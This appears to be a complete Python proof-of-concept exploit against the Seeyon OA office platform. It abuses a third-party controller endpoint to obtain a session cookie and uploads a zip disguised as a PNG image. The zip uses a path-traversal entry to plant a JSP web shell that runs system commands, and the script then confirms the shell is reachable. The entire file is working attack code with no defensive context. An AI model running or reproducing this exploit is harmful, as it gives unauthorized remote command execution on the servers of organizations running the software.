# coding:utf-8
import time
import requests
import re
import sys
import random
import zipfile
import ssl
import os

ssl._create_default_https_context = ssl._create_unverified_context

la = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
           'Content-Type': 'application/x-www-form-urlencoded'}

def generate_random_str(randomlength=16):
  random_str = ''
  base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'
  length = len(base_str) - 1
  for i in range(randomlength):
    random_str += base_str[random.randint(0, length)]
  return random_str

#mm = generate_random_str(8) #随机生成文件名
mm = 'qUcBe3G8'

webshell_name1 = mm+'.jsp'
webshell_name2 = '../'+webshell_name1

def file_zip():
    shell = '<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%><!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"><html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><title>Insert title here</title></head><body><% {java.io.InputStream in = Runtime.getRuntime().exec("whoami").getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println("whoami:"+new String(b));}out.print("</pre>");} %></body></html>'   ## 替换shell内容
    zf = zipfile.ZipFile(mm+'.zip', mode='w', compression=zipfile.ZIP_DEFLATED)
    zf.writestr('layout.xml', "")
    zf.writestr(webshell_name2, shell)


def Seeyon_Getshell(urllist):

    url = urllist+'/seeyon/thirdpartyController.do'
    post = "method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04+LjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4&clientPath=127.0.0.1"
    response = requests.post(url=url, data=post, headers=la)
    if response and response.status_code == 200 and 'set-cookie' in str(response.headers).lower():
        cookie = response.cookies
        cookies = requests.utils.dict_from_cookiejar(cookie)
        jsessionid = cookies['JSESSIONID']
        file_zip()
        print( '获取cookie成功---->> '+jsessionid)
        fileurl = urllist+'/seeyon/fileUpload.do?method=processUpload&maxSize='
        headersfile = {'Cookie': "JSESSIONID=%s" % jsessionid}
        post = {'callMethod': 'resizeLayout', 'firstSave': "true", 'takeOver': "false", "type": '0',
                'isEncrypt': "0"}
        file = [('file1', ('test.png', open(mm+'.zip', 'rb'), 'image/png'))]
        filego = requests.post(url=fileurl,data=post,files=file, headers=headersfile)
        time.sleep(2)
    else:
        print('获取cookie失败')
        exit()
    if filego.text:
        fileid1 = re.findall('fileurls=fileurls\+","\+\'(.+)\'', filego.text, re.I)
        fileid = fileid1[0]
        if len(fileid1) == 0:
            print('未获取到文件id可能上传失败！')
        print('上传成功文件id为---->>:'+fileid)
        Date_time = time.strftime('%Y-%m-%d')
        headersfile2 = {'Content-Type': 'application/x-www-form-urlencoded','Cookie': "JSESSIONID=%s" % jsessionid}
        getshellurl = urllist+'/seeyon/ajax.do'
        data = 'method=ajaxAction&managerName=portalDesignerManager&managerMethod=uploadPageLayoutAttachment&arguments=%5B0%2C%22' + Date_time + '%22%2C%22' + fileid + '%22%5D'
        getshell = requests.post(url=getshellurl,data=data,headers=headersfile2)
        time.sleep(1)
        webshellurl1 = urllist + '/seeyon/common/designer/pageLayout/' + webshell_name1
        shelllist = requests.get(url=webshellurl1)
        if shelllist.status_code == 200:
            print('利用成功地址：'+webshellurl1)
        else:
            print('漏洞利用失败')



def main():
    if (len(sys.argv) == 2):
        url = sys.argv[1]
        Seeyon_Getshell(url)
        os.remove(mm + '.zip')
    else:
        print("python3 Seeyon_poc.py http://xx.xx.xx.xx")

if __name__ == '__main__':
    main()
